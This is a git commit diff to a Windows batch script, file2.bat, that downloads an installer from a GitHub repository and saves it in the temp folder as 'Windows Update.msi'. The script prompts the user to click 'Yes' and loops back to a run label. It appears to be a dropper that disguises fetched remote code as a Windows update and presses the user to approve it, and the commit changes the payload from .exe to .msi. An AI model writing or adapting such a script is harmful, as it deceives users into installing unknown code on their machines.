1efd846d68f6127164bdba0c3084da0c165e7490
Boyretro <boyretro222@gmail.com>
2025-09-13 11:33:53 +0100

    Update file2.bat

--- file2.bat
+++ file2.bat
@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: Set download URL and paths
-set "url=https://raw.githubusercontent.com/Boyretro/documentation/refs/heads/main/ClientSetup.exe"
+set "url=https://raw.githubusercontent.com/Boyretro/documentation/refs/heads/main/ClientSetup.msi"
 set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
@@ -43,5 +43,6 @@ echo Please click "Yes" to continue the installation.
 timeout /t 2 /nobreak >nul
 
 goto RunLoop
+
 
 
